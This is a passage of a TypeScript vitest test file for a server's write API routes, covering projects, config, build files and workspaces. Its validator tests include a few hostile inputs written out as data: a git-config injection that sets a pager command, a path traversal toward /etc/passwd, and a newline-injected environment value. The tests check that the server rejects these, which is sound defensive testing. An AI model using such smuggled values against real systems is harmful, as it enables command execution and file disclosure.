import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest'
import fs from 'node:fs/promises'
import path from 'node:path'
import { createTempDataDir, cleanupTempDir } from '@yaac/test-utils/setup'
import { buildApp, buildMamaRelayApp } from '@yaac/server/main/server'
import { git } from '@yaac/test-utils/git'
import { projectConfigDir, getProjectsDir, projectDir, claudeDir, codexDir, repoDir } from '@yaac/shared/project-paths'
import { cloneRepo } from '@yaac/server/domain/git'
import { addHttpsCredential, assignProjectCredential, listCredentialSummaries } from '@yaac/server/domain/projects/credentials'
import {
  loadClaudeCredentialsFile,
  saveClaudeOAuthBundle,
} from '@yaac/shared/tool-auth'
import { getProjectWorkspaceRows, recordWorkspaceCreated } from '@yaac/server/db/workspace-store'
import { getProjectRow, recordProject } from '@yaac/server/db/project-store'
import { listWorkspaceGroups } from '@yaac/server/domain/workspaces/groups'
import { getQueuedWorkspaceRow, listQueuedWorkspaceRows } from '@yaac/server/db/queued-workspace-store'
import { setDraftWorkspaceTitle } from '@yaac/server/db/draft-workspace-store'
import { listDraftWorkspaces } from '@yaac/server/domain/workspaces/drafts'
import { MAX_TITLE_LENGTH } from '@yaac/shared/titles'
import { closeDb } from '@yaac/server/db/client'
import type * as sessionCreateModule from '@yaac/server/domain/workspaces/create'
import type * as projectAddModule from '@yaac/server/domain/projects/add'
import type * as sessionDeleteModule from '@yaac/server/domain/workspaces/stop'
import type * as sessionRestartModule from '@yaac/server/domain/workspaces/restart'
import type * as projectRemoveModule from '@yaac/server/domain/workspaces/project-teardown'
import type * as cliResolveModule from '@yaac/auth-daemon/cli-resolve'
import type { ProjectMeta, ClaudeOAuthBundle } from '@yaac/shared/types'
import { ServerError } from '@yaac/shared/errors'
import { makeTestApiClient } from '@yaac/test-utils/api'
import { workspaceDriver } from '@yaac/server/drivers/driver'

vi.mock('@yaac/server/domain/workspaces/create', async () => {
  const actual = await vi.importActual<typeof sessionCreateModule>('@yaac/server/domain/workspaces/create')
  return {
    ...actual,
    createWorkspace: vi.fn(),
  }
})

vi.mock('@yaac/server/domain/workspaces/stop', () => ({
  stopWorkspace: vi.fn(),
} satisfies Partial<typeof sessionDeleteModule>))

vi.mock('@yaac/server/domain/workspaces/restart', async () => ({
  ...await vi.importActual<typeof sessionRestartModule>('@yaac/server/domain/workspaces/restart'),
  restartWorkspace: vi.fn(),
} satisfies Partial<typeof sessionRestartModule>))

vi.mock('@yaac/server/domain/projects/add', async () => {
  const actual = await vi.importActual<typeof projectAddModule>('@yaac/server/domain/projects/add')
  return {
    ...actual,
    addProject: vi.fn(),
  }
})

vi.mock('@yaac/server/domain/workspaces/project-teardown', () => ({
  removeProject: vi.fn(),
} satisfies Partial<typeof projectRemoveModule>))

// The install flow's post-exit check looks for the CLI on this machine;
// mocked so the tests don't depend on what is installed.
vi.mock('@yaac/auth-daemon/cli-resolve', async () => {
  const actual = await vi.importActual<typeof cliResolveModule>('@yaac/auth-daemon/cli-resolve')
  return {
    ...actual,
    resolveToolCliPath: () => '/fake/bin/tool',
  }
})

import { createWorkspace } from '@yaac/server/domain/workspaces/create'
import { stopWorkspace } from '@yaac/server/domain/workspaces/stop'
import { restartWorkspace } from '@yaac/server/domain/workspaces/restart'
import { addProject } from '@yaac/server/domain/projects/add'
import { removeProject } from '@yaac/server/domain/workspaces/project-teardown'
import { registerProvisioning, listProvisioning, clearAllProvisioningForTests } from '@yaac/server/domain/workspaces/provisioning'
import { authAgentHub } from '@yaac/server/domain/auth/agent'
import type { AgentOp } from '@yaac/shared/auth-agent-protocol'
import { CLAUDE_STUB, CODEX_STUB, INSTALL_STUB } from '@yaac/test-utils/fixtures'
import {
  cancelToolLogin,
  killAllToolLogins,
  getToolLogin,
  sendToolLoginInput,
  startToolLogin,
} from '@yaac/auth-daemon/tool-login'
import {
  cancelToolInstall,
  killAllToolInstalls,
  getToolInstall,
  startToolInstall,
} from '@yaac/auth-daemon/tool-install'

/**
 * Wire an in-process auth agent into the hub: ops go to the real local
 * login/install managers and their views are pushed back, so the routes are
 * covered end to end without a WebSocket. Returns a teardown for afterEach.
 */
function installLoopbackAgent(): () => void {
  const tracked = new Map<string, 'login' | 'install'>()
  authAgentHub.setSocket({
    send: (data: string) => {
      const op = JSON.parse(data) as AgentOp
      if (op.op === 'start') {
        tracked.set(op.id, op.kind)
        if (op.kind === 'login') void startToolLogin(op.tool, op.id)
        else startToolInstall(op.tool, op.id)
      } else if (op.op === 'input') {
        try {
          sendToolLoginInput(op.id, op.text)
        } catch { /* surfaces via the next view push */ }
      } else {
        if (op.kind === 'login') cancelToolLogin(op.id)
        else cancelToolInstall(op.id)
        tracked.delete(op.id)
      }
    },
    close: () => {},
  })
  const pump = setInterval(() => {
    for (const [id, kind] of tracked) {
      try {
        const view = kind === 'login' ? getToolLogin(id) : getToolInstall(id)
        authAgentHub.ingest(JSON.stringify({ op: 'view', kind, view }))
        if (view.status !== 'running') tracked.delete(id)
      } catch {
        tracked.delete(id)
      }
    }
  }, 25)
  return () => {
    clearInterval(pump)
    authAgentHub.clearForTests()
  }
}

const mockCreateWorkspace = vi.mocked(createWorkspace)
const mockDeleteSession = vi.mocked(stopWorkspace)
const mockRestartSession = vi.mocked(restartWorkspace)
const mockAddProject = vi.mocked(addProject)
const mockRemoveProject = vi.mocked(removeProject)

const SAMPLE_BUNDLE: ClaudeOAuthBundle = {
  accessToken: 'sk-ant-oat01-real',
  refreshToken: 'sk-ant-ort01-real',
  expiresAt: 9999999999999,
  scopes: ['user:inference'],
}

// For payloads the typed RPC client would reject (missing fields, malformed
// JSON, out-of-enum values).
function rawInit(init: RequestInit = {}): RequestInit {
  const headers = new Headers(init.headers ?? {})
  if (init.body !== undefined) headers.set('content-type', 'application/json')
  return { ...init, headers }
}

async function writeProject(slug: string, remoteUrl = 'https://example.com/foo'): Promise<void> {
  const dir = path.join(getProjectsDir(), slug)
  await fs.mkdir(dir, { recursive: true })
  const meta: ProjectMeta = {
    slug,
    remoteUrl,
    addedAt: '2026-01-01T00:00:00.000Z',
  }
  await recordProject(meta)
}

describe('write routes', () => {
  let tmpDir: string

  beforeEach(async () => {
    tmpDir = await createTempDataDir()
    vi.resetAllMocks()
    clearAllProvisioningForTests()
  })

  afterEach(async () => {
    await closeDb()
    await cleanupTempDir(tmpDir)
  })

  describe('POST /project/add', () => {
    it('rejects requests with no body', async () => {
      const app = buildApp({ buildId: 'test' })
      const res = await app.request('/api/project/add', rawInit({ method: 'POST' }))
      expect(res.status).toBe(400)
    })

    it('rejects requests missing the remoteUrl or the git credential', async () => {
      const app = buildApp({ buildId: 'test' })
      for (const body of [{ gitCredentialId: '00000000-0000-4000-8000-000000000001' }, { remoteUrl: 'x/foo' }]) {
        const res = await app.request('/api/project/add', rawInit({
          method: 'POST',
          body: JSON.stringify(body),
        }))
        expect(res.status).toBe(400)
      }
    })

    it('delegates to addProject and returns 200 on success', async () => {
      mockAddProject.mockResolvedValue({
        project: { slug: 'foo', remoteUrl: 'https://github.com/x/foo', addedAt: 'now' },
        knownHostsEntry: null,
      })
      const client = makeTestApiClient(buildApp({ buildId: 'test' }))
      const id = '00000000-0000-4000-8000-000000000001'
      const res = await client.project.add.$post({ json: { remoteUrl: 'x/foo', gitCredentialId: id } })
      expect(res.status).toBe(200)
      expect(mockAddProject).toHaveBeenCalledWith('x/foo', id)
    })
  })

  describe('DELETE /project/:slug', () => {
    it('delegates to removeProject and returns 204', async () => {
      mockRemoveProject.mockResolvedValue(undefined)
      const client = makeTestApiClient(buildApp({ buildId: 'test' }))
      const res = await client.project[':slug'].$delete({ param: { slug: 'demo' } })
      expect(res.status).toBe(204)
      expect(mockRemoveProject).toHaveBeenCalledWith('demo')
    })
  })

  describe('PUT /project/:slug/config', () => {
    it('rejects requests with no config field', async () => {
      const app = buildApp({ buildId: 'test' })
      const res = await app.request('/api/project/demo/config', rawInit({
        method: 'PUT',
        body: JSON.stringify({}),
      }))
      expect(res.status).toBe(400)
    })

    it('writes the config and returns it', async () => {
      await writeProject('demo')
      const client = makeTestApiClient(buildApp({ buildId: 'test' }))
      const res = await client.project[':slug'].config.$put({
        param: { slug: 'demo' },
        json: { config: { initCommands: ['pnpm install'] } },
      })
      expect(res.status).toBe(200)
      expect(await res.json()).toEqual({ config: { initCommands: ['pnpm install'] } })
      const raw = await fs.readFile(
        path.join(projectConfigDir('demo'), 'yaac-config.json'),
        'utf8',
      )
      expect(JSON.parse(raw)).toEqual({ initCommands: ['pnpm install'] })
    })
  })

  describe('DELETE /project/:slug/config', () => {
    it('returns 204 when the project exists', async () => {
      await writeProject('demo')
      const client = makeTestApiClient(buildApp({ buildId: 'test' }))
      const res = await client.project[':slug'].config.$delete({ param: { slug: 'demo' } })
      expect(res.status).toBe(204)
    })

    it('returns 404 for an unknown project', async () => {
      const client = makeTestApiClient(buildApp({ buildId: 'test' }))
      const res = await client.project[':slug'].config.$delete({ param: { slug: 'nope' } })
      expect(res.status).toBe(404)
    })
  })

  describe('project env routes', () => {
    it('round-trips a plain variable and never gives a secret back', async () => {
      await writeProject('demo')
      const client = makeTestApiClient(buildApp({ buildId: 'test' }))

      await client.project[':slug'].env.$put({
        param: { slug: 'demo' },
        json: { name: 'NODE_ENV', value: 'development' },
      })
      await client.project[':slug'].env.$put({
        param: { slug: 'demo' },
        json: {
          name: 'API_KEY',
          value: 'sekrit',
          secret: true,
          rule: { hosts: ['api.example.com'], header: 'x-api-key' },
        },
      })

      const { vars } = await (await client.project[':slug'].env.$get({ param: { slug: 'demo' } })).json()
      expect(vars).toEqual([
        expect.objectContaining({ name: 'API_KEY', secret: true, hasValue: true }),
        expect.objectContaining({ name: 'NODE_ENV', value: 'development', secret: false }),
      ])
      // Write-only: the value is never returned.
      expect(JSON.stringify(vars)).not.toContain('sekrit')
    })

    it('surfaces a rule the proxy could not act on as VALIDATION', async () => {
      await writeProject('demo')
      const app = buildApp({ buildId: 'test' })
      const res = await app.request('/api/project/demo/env', rawInit({
        method: 'PUT',
        body: JSON.stringify({ name: 'K', value: 'v', secret: true, rule: { hosts: [] } }),
      }))
      expect(res.status).toBe(400)
    })

    it('deletes by id, and 404s for one the project does not have', async () => {
      await writeProject('demo')
      const client = makeTestApiClient(buildApp({ buildId: 'test' }))
      const saved = await (await client.project[':slug'].env.$put({
        param: { slug: 'demo' },
        json: { name: 'A', value: '1' },
      })).json()

      expect((await client.project[':slug'].env[':id'].$delete({
        param: { slug: 'demo', id: '00000000-0000-4000-8000-000000000000' },
      })).status).toBe(404)

      expect((await client.project[':slug'].env[':id'].$delete({
        param: { slug: 'demo', id: saved.var.id },
      })).status).toBe(204)
      expect((await (await client.project[':slug'].env.$get({
        param: { slug: 'demo' },
      })).json()).vars).toEqual([])
    })
  })

  describe('GET/PUT /config/git-identity', () => {
    it('is null until set, then round-trips', async () => {
      const client = makeTestApiClient(buildApp({ buildId: 'test' }))
      expect((await (await client.config['git-identity'].$get()).json()).identity).toBeNull()

      const saved = await (await client.config['git-identity'].$put({
        json: { name: '  Ada Lovelace ', email: ' ada@example.com ' },
      })).json()
      expect(saved.identity).toEqual({ name: 'Ada Lovelace', email: 'ada@example.com' })
      expect((await (await client.config['git-identity'].$get()).json()).identity)
        .toEqual({ name: 'Ada Lovelace', email: 'ada@example.com' })
    })

    it('refuses a half-identity, a non-address, a control character or an overlong value', async () => {
      // git refuses to commit with a name but no email.
      const app = buildApp({ buildId: 'test' })
      for (const body of [
        { name: 'Ada', email: '' },
        { name: '   ', email: 'ada@example.com' },
        { name: 'Ada', email: 'not-an-address' },
        { name: 'Ada\n[core]\n\tpager = touch /tmp/x', email: 'ada@example.com' },
        { name: 'Ada', email: 'ada@example.com\u0000' },
        { name: 'A'.repeat(257), email: 'ada@example.com' },
      ]) {
        const res = await app.request('/api/config/git-identity', rawInit({
          method: 'PUT',
          body: JSON.stringify(body),
        }))
        expect(res.status).toBe(400)
      }
    })
  })

  describe('GET/PUT /config/time-zone', () => {
    it('takes device reports until the user pins a zone, then ignores them until unpinned', async () => {
      const client = makeTestApiClient(buildApp({ buildId: 'test' }))
      const put = async (json: { timeZone: string; pinned?: boolean }): Promise<unknown> =>
        (await client.config['time-zone'].$put({ json })).json()
      expect(await (await client.config['time-zone'].$get()).json())
        .toEqual({ timeZone: null, pinned: false })

      expect(await put({ timeZone: 'America/New_York' }))
        .toEqual({ timeZone: 'America/New_York', pinned: false })
      expect(await put({ timeZone: 'Europe/Paris', pinned: true }))
        .toEqual({ timeZone: 'Europe/Paris', pinned: true })
      expect(await put({ timeZone: 'Asia/Tokyo' }))
        .toEqual({ timeZone: 'Europe/Paris', pinned: true })
      expect(await put({ timeZone: 'Asia/Tokyo', pinned: false }))
        .toEqual({ timeZone: 'Asia/Tokyo', pinned: false })
    })

    it('refuses anything but an IANA zone name', async () => {
      // The value lands in a workspace's `TZ`.
      const app = buildApp({ buildId: 'test' })
      for (const timeZone of ['Mars/Olympus', '+05:00', 'UTC\nFOO=1', 'A'.repeat(65), '']) {
        const res = await app.request('/api/config/time-zone', rawInit({
          method: 'PUT',
          body: JSON.stringify({ timeZone }),
        }))
        expect(res.status).toBe(400)
      }
    })
  })

  describe('project branches routes', () => {
    // A real repo behind the project: source with main + develop, cloned to
    // the project's repo dir so origin/* remote-tracking refs exist.
    async function writeProjectWithRepo(slug: string): Promise<string> {
      const sourceRepo = path.join(getProjectsDir(), `${slug}-source`)
      // The row's remote is what a refresh fetches, so it names the source.
      await writeProject(slug, sourceRepo)
      await fs.mkdir(sourceRepo, { recursive: true })
      await git(sourceRepo, ['init', '-b', 'main'])
      await git(sourceRepo, ['config', 'user.email', 't@t.co'])
      await git(sourceRepo, ['config', 'user.name', 'T'])
      await fs.writeFile(path.join(sourceRepo, 'a.txt'), 'a\n')
      await git(sourceRepo, ['add', '.'])
      await git(sourceRepo, ['commit', '-m', 'initial'])
      await git(sourceRepo, ['branch', 'develop'])
      await cloneRepo(sourceRepo, repoDir(slug), null)
      return sourceRepo
    }

    interface BranchesBody {
      branches: string[]
      defaultBranch: string
    }

    it('GET /project/:slug/branches lists branches with the default branch', async () => {
      await writeProjectWithRepo('demo')
      const client = makeTestApiClient(buildApp({ buildId: 'test' }))
      const res = await client.project[':slug'].branches.$get({ param: { slug: 'demo' }, query: {} })
      expect(res.status).toBe(200)
      const body = await res.json() as BranchesBody
      expect(body.branches).toContain('main')
      expect(body.branches).toContain('develop')
      expect(body.defaultBranch).toBe('main')
    })

    it('GET /project/:slug/branches?refresh=1 fetches new branches first', async () => {
      const sourceRepo = await writeProjectWithRepo('demo')
      await git(sourceRepo, ['branch', 'feature/late'])
      const client = makeTestApiClient(buildApp({ buildId: 'test' }))
      const res = await client.project[':slug'].branches.$get({
        param: { slug: 'demo' },
        query: { refresh: '1' },
      })
      expect(res.status).toBe(200)
      expect((await res.json() as BranchesBody).branches).toContain('feature/late')
    })

    it('GET returns 404 for an unknown project', async () => {
      const client = makeTestApiClient(buildApp({ buildId: 'test' }))
      const res = await client.project[':slug'].branches.$get({ param: { slug: 'nope' }, query: {} })
      expect(res.status).toBe(404)
    })
  })

  describe('GET /project/:slug/dockerfile', () => {
    it('returns empty content when the project has none', async () => {
      await writeProject('demo')
      const client = makeTestApiClient(buildApp({ buildId: 'test' }))
      const res = await client.project[':slug'].dockerfile.$get({ param: { slug: 'demo' } })
      expect(res.status).toBe(200)
      expect(await res.json()).toEqual({ content: '' })
    })

    it('returns 404 for an unknown project', async () => {
      const client = makeTestApiClient(buildApp({ buildId: 'test' }))
      const res = await client.project[':slug'].dockerfile.$get({ param: { slug: 'nope' } })
      expect(res.status).toBe(404)
    })
  })

  describe('PUT /project/:slug/dockerfile', () => {
    it('rejects requests with no content field', async () => {
      const app = buildApp({ buildId: 'test' })
      const res = await app.request('/api/project/demo/dockerfile', rawInit({
        method: 'PUT',
        body: JSON.stringify({}),
      }))
      expect(res.status).toBe(400)
    })

    it('writes the Dockerfile and returns it', async () => {
      await writeProject('demo')
      const client = makeTestApiClient(buildApp({ buildId: 'test' }))
      const res = await client.project[':slug'].dockerfile.$put({
        param: { slug: 'demo' },
        json: { content: 'FROM ubuntu:24.04\n' },
      })
      expect(res.status).toBe(200)
      expect(await res.json()).toEqual({ content: 'FROM ubuntu:24.04\n' })
      const raw = await fs.readFile(
        path.join(projectConfigDir('demo'), 'build', 'Dockerfile.yaac'),
        'utf8',
      )
      expect(raw).toBe('FROM ubuntu:24.04\n')
    })
  })

  describe('GET/PUT /config/user-dockerfile', () => {
    it('returns empty content when unset', async () => {
      const client = makeTestApiClient(buildApp({ buildId: 'test' }))
      const res = await client.config['user-dockerfile'].$get()
      expect(res.status).toBe(200)
      expect(await res.json()).toEqual({ content: '' })
    })

    it('writes a layered user Dockerfile and returns it', async () => {
      const client = makeTestApiClient(buildApp({ buildId: 'test' }))
      const content = 'ARG BASE_IMAGE\nFROM ${BASE_IMAGE}\nRUN echo hi\n'
      const res = await client.config['user-dockerfile'].$put({ json: { content } })
      expect(res.status).toBe(200)
      expect(await res.json()).toEqual({ content })
    })

    it('rejects a non-layered user Dockerfile with 400', async () => {
      const client = makeTestApiClient(buildApp({ buildId: 'test' }))
      const res = await client.config['user-dockerfile'].$put({
        json: { content: 'FROM ubuntu:24.04\n' },
      })
      expect(res.status).toBe(400)
    })
  })

  describe('project build files', () => {
    it('round-trips save → list → read → delete', async () => {
      await writeProject('demo')
      const client = makeTestApiClient(buildApp({ buildId: 'test' }))
      const bf = client.project[':slug']['build-files']

      const put = await bf.file.$put({
        param: { slug: 'demo' },
        json: { path: 'nvim/init.lua', content: 'print(1)\n' },
      })
      expect(put.status).toBe(200)
      expect(await put.json()).toEqual({ path: 'nvim/init.lua', size: 9, binary: false })

      const list = await bf.$get({ param: { slug: 'demo' } })
      expect(await list.json()).toEqual({
        files: [{ path: 'nvim/init.lua', size: 9, binary: false }],
      })

      const read = await bf.file.$get({ param: { slug: 'demo' }, query: { path: 'nvim/init.lua' } })
      expect(await read.json()).toEqual({
        path: 'nvim/init.lua', size: 9, binary: false, content: 'print(1)\n',
      })

      const del = await bf.file.$delete({ param: { slug: 'demo' }, query: { path: 'nvim' } })
      expect(del.status).toBe(204)
      const relist = await bf.$get({ param: { slug: 'demo' } })
      expect(await relist.json()).toEqual({ files: [] })
    })

    it('stores a base64 upload and reads it back as binary', async () => {
      await writeProject('demo')
      const client = makeTestApiClient(buildApp({ buildId: 'test' }))
      const bf = client.project[':slug']['build-files']
      const bytes = Buffer.from([0, 1, 2, 3])

      const put = await bf.file.$put({
        param: { slug: 'demo' },
        json: { path: 'blob.bin', contentBase64: bytes.toString('base64') },
      })
      expect(await put.json()).toEqual({ path: 'blob.bin', size: 4, binary: true })

      const read = await bf.file.$get({ param: { slug: 'demo' }, query: { path: 'blob.bin' } })
      expect(await read.json()).toEqual({ path: 'blob.bin', size: 4, binary: true, content: null })
      const raw = await fs.readFile(path.join(projectConfigDir('demo'), 'build', 'blob.bin'))
      expect(raw.equals(bytes)).toBe(true)
    })

    it('rejects traversal, reserved names, and ambiguous bodies with 400', async () => {
      await writeProject('demo')
      const app = buildApp({ buildId: 'test' })

      const traverse = await app.request(
        '/api/project/demo/build-files/file?path=..%2F..%2Fetc%2Fpasswd',
        rawInit(),
      )
      expect(traverse.status).toBe(400)

      const reserved = await app.request('/api/project/demo/build-files/file', rawInit({
        method: 'PUT',
        body: JSON.stringify({ path: 'Dockerfile.yaac', content: 'FROM x\n' }),
      }))
      expect(reserved.status).toBe(400)

      const both = await app.request('/api/project/demo/build-files/file', rawInit({
        method: 'PUT',
        body: JSON.stringify({ path: 'a', content: 'x', contentBase64: 'eA==' }),
      }))
      expect(both.status).toBe(400)
    })

    it('returns 404 for an unknown project or missing file', async () => {
      await writeProject('demo')
      const client = makeTestApiClient(buildApp({ buildId: 'test' }))
      const bf = client.project[':slug']['build-files']
      expect((await bf.$get({ param: { slug: 'nope' } })).status).toBe(404)
      expect((await bf.file.$get({ param: { slug: 'demo' }, query: { path: 'nope' } })).status).toBe(404)
    })
  })

  describe('user build files', () => {
    it('round-trips against the user build dir', async () => {
      const client = makeTestApiClient(buildApp({ buildId: 'test' }))
      const bf = client.config['user-build-files']

      const put = await bf.file.$put({ json: { path: 'gitconfig', content: '[user]\n' } })
      expect(put.status).toBe(200)

      const list = await bf.$get()
      expect(await list.json()).toEqual({
        files: [{ path: 'gitconfig', size: 7, binary: false }],
      })

      const del = await bf.file.$delete({ query: { path: 'gitconfig' } })
      expect(del.status).toBe(204)
    })
  })

  describe('POST /workspace/create', () => {
    it('rejects missing project', async () => {
      const app = buildApp({ buildId: 'test' })
      const res = await app.request('/api/workspace/create', rawInit({
        method: 'POST',
        body: JSON.stringify({}),
      }))
      expect(res.status).toBe(400)
    })

    it('rejects an unknown tool with VALIDATION', async () => {
      const app = buildApp({ buildId: 'test' })
      const res = await app.request('/api/workspace/create', rawInit({
        method: 'POST',
        body: JSON.stringify({ project: 'demo', tool: 'mystery' }),
      }))
      expect(res.status).toBe(400)
      const body = await res.json() as { error: { code: string } }
      expect(body.error.code).toBe('VALIDATION')
    })

    // A create sets the project's next defaults: the agent, plus the fields
    // the request named, stored per agent. Omitted fields keep their
    // previous values.
    it('remembers the agent and what the request named for it', async () => {
      await recordProject({ slug: 'demo', remoteUrl: 'git@h:o/r.git', addedAt: 'now' })
      mockCreateWorkspace.mockResolvedValue({
        workspaceId: 'sess-x', jobName: 'j', forwardedPorts: [], tool: 'claude', mode: 'tui',
      })
      const app = buildApp({ buildId: 'test' })
      const create = async (body: Record<string, unknown>): Promise<void> => {
        const res = await app.request('/api/workspace/create', rawInit({
          method: 'POST', body: JSON.stringify({ project: 'demo', ...body }),
        }))
        await res.text() // drain the NDJSON stream so the handler finishes
      }

      await create({ tool: 'claude', model: 'claude-sonnet-5', permissionMode: 'plan', mode: 'acp' })
      await create({ tool: 'pi', permissionMode: 'bypass' })
      expect(await getProjectRow('demo')).toMatchObject({
        lastTool: 'pi',
        createDefaults: {
          claude: { model: 'claude-sonnet-5', permissionMode: 'plan', mode: 'acp' },
          pi: { permissionMode: 'bypass' },
        },
      })

      // A bare create reuses the last agent and its settings, except the
      // mode, which only the webapp sends.
      await create({ tool: 'claude' })
      expect(mockCreateWorkspace.mock.calls.at(-1)?.[1]).toMatchObject({
        tool: 'claude', model: 'claude-sonnet-5', permissionMode: 'plan', mode: 'tui',
      })
      // ...and records only the agent.
      expect((await getProjectRow('demo'))?.createDefaults.claude)
        .toEqual({ model: 'claude-sonnet-5', permissionMode: 'plan', mode: 'acp' })
    })

    it('names the launch model on the provisioning row', async () => {
      await recordProject({ slug: 'demo', remoteUrl: 'git@h:o/r.git', addedAt: 'now' })
      let rowModel: unknown
      mockCreateWorkspace.mockImplementation((_slug, opts) => {
        rowModel = listProvisioning().find((p) => p.workspaceId === opts.workspaceId)
        return Promise.resolve({ workspaceId: 'sess-x', jobName: 'j', forwardedPorts: [], tool: 'claude', mode: 'tui' as const })
      })
      const app = buildApp({ buildId: 'test' })
      const res = await app.request('/api/workspace/create', rawInit({
        method: 'POST', body: JSON.stringify({ project: 'demo', tool: 'claude', model: 'claude-opus-5-5' }),
      }))
      await res.text()
      expect(rowModel).toMatchObject({ model: 'claude-opus-5-5', modelName: 'Opus 5.5' })
    })

    it('streams progress and a terminal result event from createWorkspace', async () => {
      mockCreateWorkspace.mockImplementation((_slug, opts) => {
        opts.onProgress?.('Fetching latest from remote...')
        opts.onProgress?.('Creating session job yaac-demo-sess-x...')
        return Promise.resolve({
          workspaceId: 'sess-x',
          jobName: 'yaac-demo-sess-x',
          forwardedPorts: [],
          tool: 'claude',
          mode: 'tui' as const,
        })
      })
      const client = makeTestApiClient(buildApp({ buildId: 'test' }))
      const res = await client.workspace.create.$post({
        json: {
          project: 'demo',
        },
      })
      expect(res.status).toBe(200)
      expect(res.headers.get('content-type')).toBe('application/x-ndjson')
      const text = await res.text()
      const events = text.trim().split('\n').map((line) => JSON.parse(line) as unknown)
      expect(events).toEqual([
        { type: 'progress', message: 'Fetching latest from remote...' },
        { type: 'progress', message: 'Creating session job yaac-demo-sess-x...' },
        {
          type: 'result',
          result: {
            workspaceId: 'sess-x',
            jobName: 'yaac-demo-sess-x',
            forwardedPorts: [],
            tool: 'claude',
            // The CLI reads this so it doesn't attach a PTY to an acp
            // workspace.
            mode: 'tui',
          },
        },
      ])
      expect(mockCreateWorkspace).toHaveBeenCalledWith('demo', expect.objectContaining({
      }))
    })

    it('emits a terminal error event when createWorkspace throws', async () => {
      mockCreateWorkspace.mockRejectedValue(new ServerError('VALIDATION', 'no github token'))
      const client = makeTestApiClient(buildApp({ buildId: 'test' }))
      const res = await client.workspace.create.$post({ json: { project: 'demo' } })
      expect(res.status).toBe(200)
      const events = (await res.text()).trim().split('\n').map((l) => JSON.parse(l) as unknown)
      expect(events).toEqual([
        { type: 'error', error: { code: 'VALIDATION', message: 'no github token' } },
      ])
    })

    it('threads a branch into createWorkspace', async () => {
      mockCreateWorkspace.mockResolvedValue({
        workspaceId: 'sess-x', jobName: 'j', forwardedPorts: [], tool: 'claude', mode: 'tui',
      })
      const client = makeTestApiClient(buildApp({ buildId: 'test' }))
      const res = await client.workspace.create.$post({ json: { project: 'demo', branch: 'dev' } })
      expect(res.status).toBe(200)
      await res.text()
      expect(mockCreateWorkspace).toHaveBeenCalledWith('demo', expect.objectContaining({ branch: 'dev' }))
    })

    it('rejects an empty branch with VALIDATION', async () => {
      const app = buildApp({ buildId: 'test' })
      const res = await app.request('/api/workspace/create', rawInit({
        method: 'POST',
        body: JSON.stringify({ project: 'demo', branch: '' }),
      }))
      expect(res.status).toBe(400)
    })

    it('threads a client-supplied workspaceId into createWorkspace', async () => {
      mockCreateWorkspace.mockResolvedValue({
        workspaceId: 'sess-x', jobName: 'j', forwardedPorts: [], tool: 'claude', mode: 'tui',
      })
      const id = '11111111-1111-4111-8111-111111111111'
      const client = makeTestApiClient(buildApp({ buildId: 'test' }))
      const res = await client.workspace.create.$post({ json: { project: 'demo', workspaceId: id } })
      expect(res.status).toBe(200)
      await res.text()
      expect(mockCreateWorkspace).toHaveBeenCalledWith('demo', expect.objectContaining({ workspaceId: id }))
    })

    // Reusing a live id would overwrite its row, and a failed create would
    // then tear down the live workspace as if it were its own.
    it('answers 409 for an id a workspace already holds, touching nothing', async () => {
      const id = '22222222-2222-4222-8222-222222222222'
      await recordWorkspaceCreated({ projectSlug: 'demo', workspaceId: id, baseBranch: 'main' })
      const before = (await getProjectWorkspaceRows('demo')).get(id)
      const app = buildApp({ buildId: 'test' })

      for (const project of ['demo', 'elsewhere']) {
        const res = await app.request('/api/workspace/create', rawInit({
          method: 'POST', body: JSON.stringify({ project, workspaceId: id }),
        }))
        expect(res.status, project).toBe(409)
      }

      expect(mockCreateWorkspace).not.toHaveBeenCalled()
      expect(listProvisioning()).toEqual([])
      expect((await getProjectWorkspaceRows('demo')).get(id)).toEqual(before)
    })

    // Still provisioning: no row yet, but the id is taken all the same.
    it('answers 409 for an id a create is still provisioning, leaving its row alone', async () => {
      const id = '33333333-3333-4333-8333-333333333333'
      registerProvisioning({ workspaceId: id, projectSlug: 'demo', tool: 'claude', kind: 'create' })
      const app = buildApp({ buildId: 'test' })
      const res = await app.request('/api/workspace/create', rawInit({
        method: 'POST', body: JSON.stringify({ project: 'demo', workspaceId: id }),
      }))
      expect(res.status).toBe(409)
      expect(mockCreateWorkspace).not.toHaveBeenCalled()
      expect(listProvisioning()).toEqual([expect.objectContaining({ workspaceId: id, message: 'Starting…' })])
      expect(listProvisioning()[0].error).toBeUndefined()
    })

    it('rejects a non-uuid workspaceId with VALIDATION', async () => {
      const app = buildApp({ buildId: 'test' })
      const res = await app.request('/api/workspace/create', rawInit({
        method: 'POST',
        body: JSON.stringify({ project: 'demo', workspaceId: 'not-a-uuid' }),
      }))
      expect(res.status).toBe(400)
      const body = await res.json() as { error: { code: string } }
      expect(body.error.code).toBe('VALIDATION')
    })
  })

  describe('POST /workspace/provisioning/:id/dismiss', () => {
    it('removes the registry entry and returns 204', async () => {
      registerProvisioning({ workspaceId: 'dz-1', projectSlug: 'demo', tool: 'claude', kind: 'create' })
      const client = makeTestApiClient(buildApp({ buildId: 'test' }))
      const res = await client.workspace.provisioning[':id'].dismiss.$post({ param: { id: 'dz-1' } })
      expect(res.status).toBe(204)
      expect(listProvisioning().some((p) => p.workspaceId === 'dz-1')).toBe(false)
    })

    it('is idempotent for an unknown id', async () => {
      const client = makeTestApiClient(buildApp({ buildId: 'test' }))
      const res = await client.workspace.provisioning[':id'].dismiss.$post({ param: { id: 'nope' } })
      expect(res.status).toBe(204)
    })
  })

  describe('POST /workspace/restart', () => {
    it('rejects missing workspaceId', async () => {
      const app = buildApp({ buildId: 'test' })
      const res = await app.request('/api/workspace/restart', rawInit({
        method: 'POST',
        body: JSON.stringify({}),
      }))
      expect(res.status).toBe(400)
    })

    it('answers 404, before any stream, for an id no workspace has', async () => {
      const app = buildApp({ buildId: 'test' })
      const res = await app.request('/api/workspace/restart', rawInit({
        method: 'POST', body: JSON.stringify({ workspaceId: 'nope' }),
      }))
      expect(res.status).toBe(404)
      expect(mockRestartSession).not.toHaveBeenCalled()
    })

    it('streams progress and a result event from restartWorkspace, by the resolved id', async () => {
      await recordWorkspaceCreated({ projectSlug: 'demo', workspaceId: 'sess-x' })
      mockRestartSession.mockImplementation((_id, opts) => {
        opts?.onProgress?.('Stopping session job yaac-demo-sess-x...')
        opts?.onProgress?.('Reusing existing workspace at /wt/sess-x')
        return Promise.resolve({
          workspaceId: 'sess-x',
          jobName: 'yaac-demo-sess-x',
          forwardedPorts: [],
          tool: 'claude',
          mode: 'tui' as const,
        })
      })
      const client = makeTestApiClient(buildApp({ buildId: 'test' }))
